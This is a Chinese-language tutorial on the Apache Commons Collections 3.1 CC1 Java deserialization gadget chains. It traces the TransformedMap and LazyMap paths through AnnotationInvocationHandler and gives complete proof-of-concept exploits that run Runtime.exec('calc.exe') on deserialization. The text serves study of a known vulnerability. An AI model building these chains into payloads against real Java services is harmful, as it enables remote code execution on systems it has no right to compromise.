# 环境搭建

|                                  |                                |                                |           |
| -------------------------------- | ------------------------------ | ------------------------------ | --------- |
| CommonsCollections Gadget Chains | CommonsCollection Version      | JDK Version                    | Note      |
| CommonsCollections1              | CommonsCollections 3.1 - 3.2.1 | 1.7 （8u71之后已修复不可利用） |           |
| CommonsCollections2              | CommonsCollections 4.0         | 暂无限制                       | javassist |
| CommonsCollections3              | CommonsCollections 3.1 - 3.2.1 | 1.7 （8u71之后已修复不可利用） | javassist |
| CommonsCollections4              | CommonsCollections 4.0         | 暂无限制                       | javassist |
| CommonsCollections5              | CommonsCollections 3.1 - 3.2.1 | 1.8 8u76（实测8u181也可）      |           |
| CommonsCollections6              | CommonsCollections 3.1 - 3.2.1 | 暂无限制                       |           |

- jdk :1.7(8u71以下都可以)
- commons-collections:3.1

maven项目,在pom.xml下添加依赖即可

```
<dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
</dependencies>
```

# 前置知识

## Map修饰

TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执行一个回调

```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

这个decorate方法第一个参数就是要修饰的`Map`对象，第二个和第三个参数都是实现了`Transformer`接口的类的对象，分别用来转换`Map`的键和值。为`null`的话就意味着没有转换。传出的`Map`是被修饰后的`Map`

使用`put`还有`setValue`方法的时候，对应的键或者值会作为`input`参数，调用相应的`Transformer`的`transform()`方法，该方法返回一个新的对象

当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 `put` 方法时），就会触发相应参数的 Transformer 的 `transform()` 方法

这里可以看这个例子

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class BasicLearn {
    public static void main(String[] args) {
        test1();
    }
    public static void printMap(Map map){
        for (Object entry: map.entrySet()){
            System.out.println(((Map.Entry)entry).getKey());
            System.out.println(((Map.Entry)entry).getValue());
        }
    }
    public static void test1(){
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap,new KeyTransformer(),new ValueTransformer());
        outerMap.put("key","111");
        printMap(outerMap);
    }
}

class KeyTransformer implements Transformer{

    @Override
    public Object transform(Object o) {
        System.out.println("KeyTransformer");
        return "key";
    }
}
class ValueTransformer implements Transformer{

    @Override
    public Object transform(Object o) {
        System.out.println("ValueTransformer");
        return "value";
    }
}
```

当没有调用put的时候,是没有输出的,就说明没有调用我定义的这两个类里面的构造方法

## JDK动态代理

将AnnotationInvocationHandler对象用Proxy类进行代理，只要调用任意方法，就会触发AnnotationInvocationHandler的invoke方法

Proxy类就是用来创建一个代理对象的类，它提供了很多方法，但最常用的是newProxyInstance方法。

InvocationHandler接口是proxy代理实例的调用处理程序实现的一个接口，每一个proxy代理实例都有一个关联的调用处理程序；在代理实例调用方法时，方法调用被分派到调用处理程序的invoke方法

# TransfomedMap链

## 漏洞分析

Apache Commons Collections 反序列化 RCE 漏洞问题主要是由于其中的InvokerTransformer类可以通过Java的反射机制来调用任意函数，再配合其他类的包装最终完成反序列化漏洞

看看InvokerTransformer类

```
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}

/**
 * Transforms the input to result by invoking a method on the input.
 * 
 * @param input  the input object to transform
 * @return the transformed result, null if null input
 */
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
            
    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

里面的transform方法传入一个对象,然后获取这个对象的类,再利用getMethod来调用这个对象的iMethodName方法,参数是iArgs,而这两个参数是通过InvokerTransformer类的构造方法传进来的,完全可控，那就可以去调用任意类的任意方法了,因为Runtime没有serialize接口,不能进行序列化,所以我们需要利用反射来调用Runtime对象

可以这样去调用

```
        Class runtime = Class.forName("java.lang.Runtime");//获取Runtime类
        Object T0WN = new InvokerTransformer("getMethod",new Class[] {
                String.class,Class[].class},new Object[] {
                "getRuntime",null
        }).transform(runtime);//借助InvokerTransformer调用runtimeClass的getMethod方法,参数是getRuntime,最后返回的其实是一个Method对象即getRuntime方法
        Object DawnT0wn = new InvokerTransformer("invoke",new Class[]{
                Object.class,Object[].class},new Object[]{
                        null,null
        }).transform(T0WN);//借助InvokerTransformer调用T0WN的invoke方法,没有参数,最后返回的其实是DawnT0wn这个对象
        Object exec = new InvokerTransformer("exec",new Class[]{
                String.class},new Object[]{
                        "calc.exe"
        }).transform(DawnT0wn);//借助InvokerTransformer调用DawnT0wn的exec方法,参数为calc.exe,返回的自然是一个Process对象
```

- 将ConstantTransformer返回的`Runtime.class`传给第一个InvokerTransformer；
- 将第一个InvokerTransformer返回的`(Runtime.class).getMethod("getRuntime",null)`传给第二个InvokerTransformer；
- 将第二个InvokerTransformer返回的`((Runtime.class).getMethod("getRuntime",null)).invoke(null,null)`传给第三个InvokerTransformer；
- `(((Runtime.class).getMethod("getRuntime",null)).invoke(null,null)).exec("calc.exe")`是第三个InvokerTransformer的返回值。

上面只是在InvokerTransformer类中去执行任意方法

我们还需要了解两个类

- ConstantTransformer类的transform方法
- ChainedTransformer类的transform方法

先看ConstantTransformer类

![image-20211130131628264](images/1.png)

它的transform方法就是直接返回其构造函数传进来的对象

在看ChainedTransformer类的transform方法

![image-20211130131713507](images/2.png)

构造函数传进去一个Transformer接口的数组赋值给iTransformers,再再transform方法中变量数组中的每个transform方法,还把上一个返回的对象传入下一个的transform方法中

那我们只要把上面命令执行的代码,依次放到Transformer数组里即可,所以修改上面代码为

```
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{
                String.class, Class[].class}, new Object[]{
                "getRuntime", null
        }
        ),
        new InvokerTransformer("invoke", new Class[]{
                Object.class, Object[].class}, new Object[]{
                null, null
        }
        ),
        new InvokerTransformer("exec", new Class[]{
                String.class}, new Object[]{
                "calc.exe"
        }
        )
};
ChainedTransformer chain = new ChainedTransformer(transformers);
chain.transform(null);
```

现在我们就需要去找到一个可用调用ChainedTransformer对象,触发其transform方法的地方了

看到TransformedMap类这里的checkSetValue方法

```
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

看看valueTransformer的构造函数

![image-20211130180926320](images/3.png)

看来是可控的,但是仔细一看这个构造函数是protected,那应该是可以在类中回调的

不过在这个类里面还有另外一个方法

```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

修饰了应该Map对象,第一个参数是要修饰的Map对象,后面两个参数是Transformer接口的类的对象

然后直接new一个TransformedMap对象,这里可以直接这样传参进去

```
Map innermap = new HashMap();//创建一个Map对象,因为Map没有序列化接口,所以需要用到他的实现类Hashmap
innermap.put("value","key");//向里面传值,后面会提到为什么会有这一步
Map outmap = TransformedMap.decorate("innermap",null,chain);//调用静态decorate方法,把我们前面能够命令执行的gadget放进去,也就是chain作为参数传进去
```

这里能够调用TransformedMap的构造方法了,值也控制了,但是还要去找到触发checkSetValue的点

看看有哪些地方调用了这个方法

![image-20211201130756300](images/4.png)

看到只有一个setValue方法里面调用了这个checkSetValue方法

```
static class MapEntry extends AbstractMapEntryDecorator {

    /** The parent map */
    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
}
```

这里的parent不是其父类,而且在这个类里面自定义的一个属性,指向的是AbstractInputCheckedMapDecorator,也就是当前类

![image-20211201134421792](images/5.png)

跟进看到要去其子类的checkSetValue方法实现

![image-20211201134502172](images/6.png)

而TransformedMap类就是它的子类

这里梳理一下,TransformedMap类继承于AbstractInputCheckedMapDecorator类而这里的AbstractInputCheckedMapDecorator类又继承于AbstractMapDecorator类

![image-20211201134819491](images/7.png)

AbstractMapDecorator类又继承于Map类

![image-20211201134913154](images/8.png)

所以当我们调用Map.setValue()的时候就会调用到这里的setValue方法,然后触发checkSetValue方法然后调用了valueTransformer的transform方法，而valueTransformer就是我们传入的chain，chain又是ChainedTransformer的实例化对象，也就是成功调用了ChainedTransformer的transformer方法，从而实现对transformers数组进行回调

那接下来就要去找到一个调用setValue方法的地方了,当然了,如果是重写了的readObject方法调用的最后,不然我们就再去找到另外一个调用setValue方法的方法,再去找有没有readObject调用了那个方法的

不过好在这里有一个重写后的readObject调用了setValue方法

```
sun.reflect.annotation.AnnotationInvocationHandler类
```

里面的readObject方法

```
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();
    AnnotationType var2 = null;

    try {
        var2 = AnnotationType.getInstance(this.type);
    } catch (IllegalArgumentException var9) {
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map var3 = var2.memberTypes();
    Iterator var4 = this.memberValues.entrySet().iterator();

    while(var4.hasNext()) {
        Entry var5 = (Entry)var4.next();
        String var6 = (String)var5.getKey();
        Class var7 = (Class)var3.get(var6);
        if (var7 != null) {
            Object var8 = var5.getValue();
            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
            }
        }
    }

}
```

还是先看一下构造函数

```
AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
    Class[] var3 = var1.getInterfaces();
    if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
        this.type = var1;
        this.memberValues = var2;
    } else {
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    }
}
```

第一个参数是Annotation注解类的继承类,这里可以用Retention类,第二个是Map类的接口,传进来的是可控的

```
先了解一下自定义注解。

定义新的 Annotation 类型使用 @interface 关键字

自定义注解自动继承了java.lang.annotation.Annotation接口

Annotation 的成员变量在 Annotation 定义中以无参数方法的形式来声明。其 方法名和返回值定义了该成员的名字和类型。我们称为配置参数。类型只能 是八种基本数据类型、String类型、Class类型、enum类型、Annotation类型、 以上所有类型的数组。

可以在定义 Annotation 的成员变量时为其指定初始值, 指定成员变量的初始 值可使用 default 关键字  如果只有一个参数成员，建议使用参数名为value

如果定义的注解含有配置参数，那么使用时必须指定参数值，除非它有默认 值。格式是“参数名 = 参数值” ，如果只有一个参数成员，且名称为value， 可以省略“value=”

没有成员定义的 Annotation 称为标记; 包含成员变量的 Annotation 称为元数 据 Annotation
注意：自定义注解必须配上注解的信息处理流程才有意义。
```

看Retention类

![image-20211201234826443](images/9.png)

通过`@interface`说明是一个新定义的`Annotation`，默认继承了`java.lang.annotation.Annotation`接口，因此这也满足了`Class<? extends Annotation> var1`

用我自己的理解可以简要的认为,有`@interface`关键字就是默认继承了`java.lang.annotation.Annotation`

再回到readObject方法,首先调用了`AnnotationType.getInstance(this.type)`

```
try {
        var2 = AnnotationType.getInstance(this.type);
    } catch (IllegalArgumentException var9) {
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }
```

跟进getInstance，这里的var0是传入Retention

![image-20211201225452461](images/10.png)

跟进AnnotationType

![image-20211201225517871](images/11.png)

var1还是传进来的Retention

```
Method[] var2 = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
    public Method[] run() {
        return var1.getDeclaredMethods();
    }
});
```

获取Retention类的所有方法

然后循环,var6数组存储了每一个方法名

```
String var7 = var6.getName();
```

这里var7的值就是获取的每一个方法名

```
this.memberTypes.put(var7, invocationHandlerReturnType(var8));
```

![image-20211201230522019](images/12.png)

可以看到memberTypes是一个Map对象,调用里面的put方法,里面的key就是var7,而Retention类只有一个方法就是value

![image-20211201230622307](images/13.png)

所以key值(键名)就是value,然后回到到getInstance,最后返回一个var2存储到readObject的var2里面

![image-20211201230804690](images/14.png)

接下来调用其memberTypes方法

```
Map var3 = var2.memberTypes();
Iterator var4 = this.memberValues.entrySet().iterator();
```

![image-20211201222836712](images/15.png)

memberTypes返回的是其memberTypes属性,这里的memberTypes属性就是刚才var2的memberTypes,也就是value

接下来就是while循环`this.memberValues`这个Map对象的迭代器,`var4.hasNext()`用于检测集合中是否还有元素

```
while(var4.hasNext()) {
	//循环遍历Map
    Entry var5 = (Entry)var4.next();
    //获取里面的键名
    String var6 = (String)var5.getKey();
    //在var3中寻找是否有键名是var6的值,若没有则返回null,这就是为什么要innermap.put("value","xxx");
    Class var7 = (Class)var3.get(var6);
    if (var7 != null) {
        Object var8 = var5.getValue();
        if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
            var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
            //var5是Map的对象,这里就调用了Map.setValue触发了checkValue
        }
    }
}
```

最后一个if判断,如果不是memberValues值的实例,并且不是ExceptionProxy的接口就可以调用setValue方法

不过要注意AnnotationInvocationHandler虽然有序列化接口,但是是一个内部类,不能直接获取,需要利用反射的方法

![image-20211201231855031](images/16.png)

```
Class T0WN = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = T0WN.getDeclaredConstructor(Class.class,Map.class);
constructor.setAccessible(true);//构造函数并不是public
Object instance = constructor.newInstance(Retention.class,outmap);
```

## 漏洞复现

大致的调用链

```
sun.reflect.annotation.AnnotationInvocationHandler.readObject()
	Map.setValue()
		TransformedMap.checkValue()
			ChainedTransformer.transform()
				达到任意代码执行的目的
```

exp

```
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import java.io.*;

public class Test1 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", null
                }
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, null
                }
                ),
                new InvokerTransformer("exec", new Class[]{
                        String.class}, new Object[]{
                        "calc.exe"
                }
                )
        };

        ChainedTransformer chain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value","key");
        Map outmap = TransformedMap.decorate(innermap, null, chain);

        Class T0WN = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = T0WN.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class,outmap);

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        os.writeObject(instance);

        ObjectInputStream fos = new ObjectInputStream(new FileInputStream("ser.bin"));
        fos.readObject();
    }
}
```

![image-20211201233209350](images/17.png)

这个POC只有在Java 8u71以前的版本中才能执行成功，Java 8u71以后的版本由于`sun.reflect.annotation.AnnotationInvocationHandler`发⽣了变化导致不再可⽤；

在ysoserial里面用的是另外一条链

![image-20211214091500383](images/18.png)

# LazyMap链

## 漏洞分析

从上面的调用链可以看到,在后半段的transform方法并没有变,而是调用transform方法的地方不再是transformedMap,而是LazyMap类

前半部分和TransforedMap链一样

```
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{
                String.class, Class[].class}, new Object[]{
                "getRuntime", null
        }
        ),
        new InvokerTransformer("invoke", new Class[]{
                Object.class, Object[].class}, new Object[]{
                null, null
        }
        ),
        new InvokerTransformer("exec", new Class[]{
                String.class}, new Object[]{
                "calc.exe"
        }
        )
};
ChainedTransformer chain = new ChainedTransformer(transformers);
chain.transform(null);
```

在触发transfrom方法的点有了差别

```
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

在LazyMap的get方法中去调用transform

和TransformedMap一样,LazyMap的构造方法是私有的,不过里面也有一个Map修饰

![image-20211214110413373](images/19.png)

能够回调LazyMap,触发相应的构造方法

![image-20211214110453002](images/20.png)

factory是Transformer的接口,只要传入的是chain,就可以调用其中的transform方法

所以相应的代码如下

```
Map innermap = new HashMap();
Map outmap = LazyMap.decorate(innermap,chain);
```

这黎不用像TransfomedMap那样put参数,看if中的条件

```
if(map.containsKey(key) == false)
```

containsKey() 方法检查 hashMap 中是否存在指定的 key 对应的映射关系

所以这里不存在key才会进入if去执行`Object value = factory.transform(key);`

接下来就要去找到一个能调用get的地方

在AnnotationInvocationHandler类的invoke方法中调用了get方法

![image-20211214111746234](images/21.png)

```
class AnnotationInvocationHandler implements InvocationHandler, Serializable 
```

这个`AnnotationInvocationHandler`实现了`InvocationHandler`接口,那就知道怎么去调用invoke方法了

可以用动态代理的方法

将`AnnotationInvocationHandler`的对象用Proxy类代理,得到一个代理实例,用这个代理实例去调用`AnnotationInvocationHandler`的任意方法即可触发`InvocationHandler`的`invoke`方法,但是在`AnnotationInvocationHandler`重写了`invoke`方法,所以会调用`AnnotationInvocationHandler`的`invoke`方法

![image-20211214182838450](images/22.png)

`this.memberValues`可控,这里就可以去触发invoke

具体怎么做呢

在TransformedMap链也说了,`AnnotationInvocationHandler`是一个内部类,需要用反射的方法去获取

```
Class DawnT0wn = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = DawnT0wn.getDeclaredConstructor(Class.class,Map.class);
        construct.setAccessible(true);//暴露反射获取AnnotationInvocationHandler的构造器
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,outmap);
        //handler是代理的请求处理器,里面是具体的处理逻辑
        Map Mapproxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
//        Map Mapproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler);
        //创建Map接口的代理实例,因为LazyMap实现了Map的接口,所以被代理类相当于LazyMap
        handler = (InvocationHandler) construct.newInstance(Retention.class,Mapproxy);
        /*
         *创建的代理实例对象叫Mapproxy,但是这里并不能直接序列化,他没有readObject操作，不能对他直接操作
         *因为入口点是sun.reflect.annotation.AnnotationInvocationHandler的readObject
         *所以用AnnotationInvocationHandler对Mapproxy进行包装,这样反序列化时调用AnnotationInvocationHandler触发readObject里面的
         *this.memberValues.entrySet().iterator()触发invoke
         */
```

## 漏洞复现

最终的POC

```
package cn.DawnT0wn;

import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;
import java.util.HashMap;
import java.lang.annotation.Retention;
public class CC1LazyMap {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", null
                }),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, null
                }),
                new InvokerTransformer("exec", new Class[]{
                        String.class}, new Object[]{
                        "calc.exe"
                })
        };

        ChainedTransformer chain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        Map outmap = LazyMap.decorate(innermap,chain);

        Class DawnT0wn = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = DawnT0wn.getDeclaredConstructor(Class.class,Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,outmap);
        Map Mapproxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
        
        handler = (InvocationHandler) construct.newInstance(Retention.class,Mapproxy);
        
        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("LazyMap.bin"));
        os.writeObject(handler);

        ObjectInputStream fos = new ObjectInputStream(new FileInputStream("LazyMap.bin"));
        fos.readObject();
    }
}
```





参考链接

https://xz.aliyun.com/t/10357#toc-6

https://www.freebuf.com/vuls/276632.html

http://1.15.187.227/index.php/archives/457/

https://su18.org/post/ysoserial-su18-2/#transformedmap

https://xz.aliyun.com/t/9873#toc-14

















